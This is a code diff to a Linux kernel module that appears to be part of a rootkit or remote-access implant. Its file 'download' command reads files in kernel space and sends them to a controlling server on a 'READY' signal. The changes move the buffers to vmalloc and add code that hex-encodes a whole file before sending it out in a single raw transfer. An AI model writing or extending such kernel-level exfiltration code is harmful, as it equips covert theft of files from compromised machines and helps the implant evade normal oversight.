@@ -14,7 +14,7 @@ bool is_downloading(void) {
 void reset_download_state(void) {
     DBG_MSG("reset_download_state: cleaning up memory\n");
     if (download_buffer)
-        kfree(download_buffer);
+        vfree(download_buffer);
     download_buffer = NULL;
     download_size = 0;
     sending_file = false;
@@ -49,8 +49,8 @@ int download_handler(char *args, enum Protocol protocol) {
         send_to_server(protocol, "File is empty or unreadable.\n");
         return -EINVAL;
     }
-
-    char *buffer = kmalloc(size, GFP_KERNEL);
+    
+    char *buffer = vmalloc(size);
     if (!buffer) {
         filp_close(filp, NULL);
         ERR_MSG("download_handler: memory allocation failed\n");
@@ -63,7 +63,7 @@ int download_handler(char *args, enum Protocol protocol) {
 
     if (read_bytes != size) {
         ERR_MSG("download_handler: read error (%d / %d)\n", read_bytes, size);
-        kfree(buffer);
+        vfree(buffer);
         send_to_server(protocol, "Error reading file.\n");
         return -EIO;
     }
@@ -85,7 +85,8 @@ int download_handler(char *args, enum Protocol protocol) {
 int download(const char *command) {
     if (sending_file && strncmp(command, "READY", 5) == 0) {
         DBG_MSG("download: received READY, starting file transfer (%ld bytes)\n", download_size);
-
+        
+        /*
         long sent = 0;
         while (sent < download_size) {
             long chunk_size = min_t(long, STD_BUFFER_SIZE - 8, download_size - sent);
@@ -98,10 +99,32 @@ int download(const char *command) {
             DBG_MSG("download: sent %d bytes (offset %ld)\n", chunk, sent);
             sent += chunk_size;
         }
+        */
 
-        DBG_MSG("download: transfer complete (%ld / %ld)\n", sent, download_size);
+        // Hexify download buffer
+        long hex_size = download_size * 2;
+        char *hex_buffer = vmalloc(hex_size + 1);
+        if (!hex_buffer) {
+            ERR_MSG("download: failed to allocate hex buffer\n");
+            reset_download_state();
+            return -ENOMEM;
+        }
+
+        for (long i = 0; i < download_size; ++i) {
+            snprintf(hex_buffer + (i * 2), 3, "%02x", (unsigned char) download_buffer[i]);
+        }
+
+        int ret = send_to_server_raw(hex_buffer, hex_size);
+        if (ret < 0) {
+            ERR_MSG("download: failed to send file\n");
+        }
+
+        vfree(hex_buffer);
+
+        // DBG_MSG("download: transfer complete (%ld / %ld)\n", sent, download_size);
         reset_download_state();
         return 0;
+
     }
 
     DBG_MSG("download: command ignored or not in transfer mode\n");
